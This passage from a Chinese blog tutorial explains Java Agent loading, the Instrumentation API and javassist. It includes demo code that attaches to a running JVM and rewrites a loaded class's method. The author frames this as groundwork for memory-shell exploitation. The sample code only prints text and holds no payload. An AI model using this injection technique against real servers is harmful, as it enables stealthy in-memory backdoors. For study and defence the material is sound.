相关的工具提供的本地编程接口集合。JVMTI 提供了一套 “代理” 程序机制，可以支持第三方工具程序以代理的方式连接和访问 JVM，并利用 JVMTI 提供的丰富的编程接口，完成很多跟 JVM 相关的功能。</p>\n</blockquote>\n<p>事实上，java.lang.instrument 包的实现，也就是基于这种机制的：<strong>在 Instrumentation 的实现当中，存在一个 JVMTI 的代理程序，通过调用 JVMTI 当中 Java 类相关的函数来完成 Java 类的动态操作</strong>。除开 Instrumentation 功能外，JVMTI 还在虚拟机内存管理，线程控制，方法和变量操作等等方面提供了大量有价值的函数。</p>\n<h2 id=\"Java-Agent的运行实现\"><a href=\"#Java-Agent的运行实现\" class=\"headerlink\" title=\"Java Agent的运行实现\"></a>Java Agent的运行实现</h2><p>Java Agent通过指定一个特定的jar包，不能单独启动，必须依附一个java应用程序运行，其运行实现有两种方式：</p>\n<p>一种是premain,一种是agentmain</p>\n<ul>\n<li>jvm方式：实现 <strong>premain</strong>方法，在JVM启动前加载。// jvm 参数形式启动，jdk 1.5之后</li>\n<li>attach方法：实现 <strong>agentmain</strong>方法，在JVM启动后加载。// 动态 attach 方式启动，jdk 1.6之后</li>\n</ul>\n<p>其中 jvm方式，也就是说要使用这个 agent 的目标应用，在启动的时候，需要指定 jvm 参数-javaagent:xxx.jar。而当目标应用程序启动之后，没有添加 -javaagent 加载我们的 agent，但我们希望目标程序使用我们的 agent，这时候就可以使用 attach 方式来使用。</p>\n<h3 id=\"premain\"><a href=\"#premain\" class=\"headerlink\" title=\"premain\"></a>premain</h3><p>hello.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hello</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Hello();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Hello</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">10</span>;i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;hello world&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>premain.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">premain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">premain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;premain agent!!!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>src目录下创建META-INF/MANIFEST.MF</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Premain-Class: premain</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>生成两个jar文件，通过 <strong>-javaagent</strong> 来执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -javaagent:premain.jar -jar hello.jar</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220614164507437.png\" alt=\"image-20220614164507437\"></p>\n<p>但是利用起来可能就比较鸡肋，无法控制项目重启以达到加载恶意jar的目的</p>\n<h3 id=\"agentmain\"><a href=\"#agentmain\" class=\"headerlink\" title=\"agentmain\"></a>agentmain</h3><p>这个就比较符合利用了，虽然项目已经启动，利用attach技术，将agent注入到目标代码中，着重关注的是 <strong>VitualMachine</strong> 这个类</p>\n<blockquote>\n<p>字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了 <strong>获取系统信息、 loadAgent，Attach 和 Detach 等方法</strong>，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过 <strong>loadAgent</strong> 方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation 实例。</p>\n</blockquote>\n<p>test.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Hello();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Hello</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">20</span>;i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;hello world&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>hello.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.tools.attach.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hello</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> AgentLoadException, IOException, AttachNotSupportedException, AgentInitializationException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;running JVM start&quot;</span>);</span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        String agent = <span class=\"string\">&quot;agentmain.jar&quot;</span>;</span><br><span class=\"line\">        Integer i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        String aim = <span class=\"string\">&quot;test.jar&quot;</span>;<span class=\"comment\">//你的jar包</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Finding: &quot;</span>+aim);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Agent jar: &quot;</span>+agent);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (vmd.displayName().contains(aim)) &#123;</span><br><span class=\"line\">                System.out.println(String.format(<span class=\"string\">&quot;[+]find %s, process id %s&quot;</span>, vmd.displayName(), vmd.id()));</span><br><span class=\"line\"></span><br><span class=\"line\">                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());  <span class=\"comment\">// 进程id号</span></span><br><span class=\"line\">                virtualMachine.loadAgent(agent);<span class=\"comment\">//你想要加载的agentmain包  loadAgent</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agentmain.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">agentmain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">agentmain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;agentmain agent!!!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>src目录下创建META-INF/MANIFEST.MF</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: agentmain</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>执行，成功注入到正在运行的hello.jar中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar hello.jar</span><br><span class=\"line\">java -jar test.jar</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220614183827076.png\" alt=\"image-20220614183827076\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220614183806947.png\" alt=\"image-20220614183806947\"></p>\n<h2 id=\"Instrumentation\"><a href=\"#Instrumentation\" class=\"headerlink\" title=\"Instrumentation\"></a>Instrumentation</h2><p>JavaAgent技术进行类的字节码修改最主要使用的就是 Java Instrumentation，它是 Java 提供的监测运行在 JVM 程序的 API</p>\n<p><strong>原理</strong></p>\n<blockquote>\n<p>instrument 的底层实现依赖于 JVMTI ，也就是 JVM Tool Interface ，它是 JVM 暴露出来的一些供用户扩展的接口集合， JVMTI 是基于事件驱动的， JVM 每执行到一定的逻辑就会调用一些事件的回调接口（如果有的话），这些接口可以供开发者去扩展自己的逻辑。 JVMTIAgent 是一个利用 JVMTI 暴露出来的接口提供了代理启动时加载(agent on load)、代理通过 attach 形式加载(agent on attach)和代理卸载(agent on unload)功能的动态库。而 instrument agent 可以理解为一类 JVMTIAgent 动态库，别名是 JPLISAgent (Java Programming Language Instrumentation Services Agent)，也就是专门为 Java 语言编写的插桩服务提供支持的代理。</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220615185513337.png\" alt=\"image-20220615185513337\"></p>\n<p>那么来看一下 Instrumentation 给我们提供了什么</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617141353158.png\" alt=\"image-20220617141353158\"></p>\n<p>这里列出实现的函数</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">类方法</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">void addTransformer(ClassFileTransformer transformer, boolean canRetransform)</td>\n<td>添加一个 Transformer，是否允许 reTransformer</td>\n</tr>\n<tr>\n<td align=\"left\">boolean removeTransformer(ClassFileTransformer transformer)</td>\n<td>移除一个 Transformer</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isRetransformClassesSupported()</td>\n<td>检测是否允许 reTransformer</td>\n</tr>\n<tr>\n<td align=\"left\">void retransformClasses(Class&lt;?&gt;… classes)</td>\n<td>重加载（retransform）类</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isModifiableClass(Class&lt;?&gt; theClass)</td>\n<td>确定一个类是否可以被 retransformation 或 redefinition 修改</td>\n</tr>\n<tr>\n<td align=\"left\">Class[] getAllLoadedClasses()</td>\n<td>获取 JVM 当前加载的所有类</td>\n</tr>\n<tr>\n<td align=\"left\">Class[] getInitiatedClasses(ClassLoader loader)</td>\n<td>获取指定类加载器下所有已经初始化的类</td>\n</tr>\n<tr>\n<td align=\"left\">long getObjectSize(Object objectToSize)</td>\n<td>返回指定对象大小</td>\n</tr>\n<tr>\n<td align=\"left\">void appendToBootstrapClassLoaderSearch(JarFile jarfile)</td>\n<td>添加到 BootstrapClassLoader 搜索</td>\n</tr>\n<tr>\n<td align=\"left\">void appendToSystemClassLoaderSearch(JarFile jarfile)</td>\n<td>添加到 SystemClassLoader 搜索</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isNativeMethodPrefixSupported()</td>\n<td>是否支持设置 native 方法 Prefix</td>\n</tr>\n<tr>\n<td align=\"left\">void setNativeMethodPrefix(ClassFileTransformer transformer, String prefix)</td>\n<td>通过允许重试，将前缀应用到名称，此方法修改本机方法解析的失败处理</td>\n</tr>\n<tr>\n<td align=\"left\">boolean isRedefineClassesSupported()</td>\n<td>是否支持类 redefine</td>\n</tr>\n<tr>\n<td align=\"left\">void redefineClasses(ClassDefinition… definitions)</td>\n<td>重定义（redefine）类</td>\n</tr>\n</tbody></table>\n<p>重点讲两个 <strong>addTransformer、retransformClasses</strong></p>\n<p>一、addTransformer 有两种，带 canRetransform 参数的指明是否允许重新转换，共有的参数为 <strong>ClassFileTransformer</strong> 类型的class文件转换器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617170017299.png\" alt=\"image-20220617170017299\"></p>\n<p>该 ClassFileTransformer 有一个transform 方法需要用户自己自定义实现，这里也是利用javassist技术进行修改字节码的地方</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617170508953.png\" alt=\"image-20220617170508953\"></p>\n<p>二、retransformClasses </p>\n<p>retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果</p>\n<h2 id=\"Instrument流程\"><a href=\"#Instrument流程\" class=\"headerlink\" title=\"Instrument流程\"></a>Instrument流程</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617153737730.png\" alt=\"image-20220617153737730\"></p>\n<ol>\n<li>在JVM启动时，通过JVM参数-javaagent，传入agent jar，Instrument Agent被加载，调用其Agent_OnLoad函数；</li>\n<li>在Instrument Agent 初始化时，注册了JVMTI初始化函数eventHandlerVMinit；</li>\n<li>在JVM启动时，会调用初始化函数eventHandlerVMinit，启动了Instrument Agent；</li>\n<li>用sun.instrument.instrumentationImpl类里的方法 <strong>loadClassAndCallPremain</strong> 方法去初始化Premain-Class指定类的premain方法。初始化函数eventHandlerVMinit，注册了class解析的ClassFileLoadHook函数；</li>\n<li>调用应用程序的main开始执行，准备解析；</li>\n<li>解析Class之前，JVM调用JVMTI的<strong>ClassFileLoadHook</strong>函数，钩子函数调用sun.instrument.instrumentationImpl类里的transform方法，通过TransformerManager的transformer方法最终调用我们自定义的Transformer类的transform方法；</li>\n<li>因为字节码在解析Class之前改的，直接使用修改后的字节码的数据流替代，最后进入Class解析，对整个Class解析无影响；</li>\n<li>重新加载Class依然重新走6-7步骤；</li>\n</ol>\n<p>先给出例子，其中利用的 javassist 下面进行学习</p>\n<p>hello.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// HelloWorld.java</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">        hello h1 = <span class=\"keyword\">new</span> hello();</span><br><span class=\"line\">        h1.hello();</span><br><span class=\"line\">        <span class=\"comment\">// 产生中断，等待注入</span></span><br><span class=\"line\">        Scanner sc = <span class=\"keyword\">new</span> Scanner(System.in);</span><br><span class=\"line\">        sc.nextInt();</span><br><span class=\"line\">        hello h2 = <span class=\"keyword\">new</span> hello();</span><br><span class=\"line\">        h2.hello();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;ends...&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// hello.java</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">hello</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hello</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;hello world&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agent.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// AgentDemo.java</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">agentmain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">agentmain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class=\"line\">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\">        <span class=\"comment\">// 判断类是否已经加载</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class aClass : classes) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (aClass.getName().equals(definetransform.editClassName)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 添加 Transformer</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> definetransform(), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">                <span class=\"comment\">// 触发 Transformer</span></span><br><span class=\"line\">                inst.retransformClasses(aClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// definetransform.java</span></span><br><span class=\"line\"><span class=\"comment\">// 如果在使用过程中找不到javassist包中的类，那么可以使用URLCLassLoader+反射的方式调用</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassClassPath;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtMethod;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.ProtectionDomain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">definetransform</span> <span class=\"keyword\">implements</span> <span class=\"title\">ClassFileTransformer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editClassName = <span class=\"string\">&quot;hello&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editMethod = <span class=\"string\">&quot;hello&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"keyword\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            ClassPool cp = ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                ClassClassPath ccp = <span class=\"keyword\">new</span> ClassClassPath(classBeingRedefined);</span><br><span class=\"line\">                cp.insertClassPath(ccp);</span><br><span class=\"line\">                CtClass ctc = cp.get(editClassName);</span><br><span class=\"line\">                CtMethod method = ctc.getDeclaredMethod(editMethod);</span><br><span class=\"line\">                String source = <span class=\"string\">&quot;&#123;System.out.println(\\&quot;hello transformer\\&quot;);&#125;&quot;</span>;</span><br><span class=\"line\">                method.setBody(source);</span><br><span class=\"line\">                <span class=\"keyword\">byte</span>[] bytes = ctc.toBytecode();</span><br><span class=\"line\">                ctc.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>META-INF/MANIFEST.MF 注意添加 Agent-Class:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\">Agent-Class: agentmain</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>生成jar</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617225517482.png\" alt=\"image-20220617225517482\"></p>\n<p>inject.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.tools.attach.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">inject</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> AgentLoadException, IOException, AttachNotSupportedException, AgentInitializationException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;running JVM start&quot;</span>);</span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        String agent = <span class=\"string\">&quot;agent.jar&quot;</span>;</span><br><span class=\"line\">        Integer i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        String aim = <span class=\"string\">&quot;HelloWorld.jar&quot;</span>;<span class=\"comment\">//你的jar包</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Finding: &quot;</span>+aim);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Agent jar: &quot;</span>+agent);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (vmd.displayName().contains(aim)) &#123;</span><br><span class=\"line\">                System.out.println(String.format(<span class=\"string\">&quot;[+]find %s, process id %s&quot;</span>, vmd.displayName(), vmd.id()));</span><br><span class=\"line\"></span><br><span class=\"line\">                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());  <span class=\"comment\">// 进程id号</span></span><br><span class=\"line\">                virtualMachine.loadAgent(agent);<span class=\"comment\">//你想要加载的agentmain包  loadAgent</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后META-INF/MANIFEST.MF生成jar</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618090327885.png\" alt=\"image-20220618090327885\"></p>\n<p>使用inject.jar，然后java -jar hello.jar成功输出注入的 “hello transformer”</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618090459247.png\" alt=\"image-20220618090459247\"></p>\n<p>下面结合流程分析一下</p>\n<p>第四步</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617153852536.png\" alt=\"image-20220617153852536\"></p>\n<p>这里调用了 loadClassAndStartAgent，会去调用agent的premain或者agentmain方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617154410372.png\" alt=\"image-20220617154410372\"></p>\n<p>那么结合例子就是进入 agentmain 后通过调用 Instrumentation 实例 inst 的addtransformer 双参数方法添加了一个我们自定义的TransformerDemo 转换器，具体实现就是实例化 <strong>TransformerManager(sun.instrument.InstrumentationImpl.class)</strong> 一个对象，调用其 addTransformer 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617155528519.png\" alt=\"image-20220617155528519\"></p>\n<p>实例化一个 TransformerInfo 对象然后存放到数组 <strong>mTransformerList</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617161618908.png\" alt=\"image-20220617161618908\"></p>\n<p>看看 TransformerInfo ，定义一个 <strong>ClassFileTransformer</strong> 类型的转换器然后放到了 <strong>mTransformer</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617161712929.png\" alt=\"image-20220617161712929\"></p>\n<p>最后通过 inst.retransformClasses(aClass) 进行重新的调用</p>\n<p>第六步</p>\n<p>HOOK函数调用了sun.instrument.instrumentationImpl类里的 <strong>transform</strong> 方法，其中调用了 <strong>TransformerManager</strong> 的 <strong>transform</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617163453049.png\" alt=\"image-20220617163453049\"></p>\n<p><strong>先获取转换器list，然后遍历list，通过transformer方法获取转换器，然后调用转换器的transform方法</strong> 也就是我们自定义的转换器中transform中利用javassist修改字节码的恶意方法</p>\n<p><img 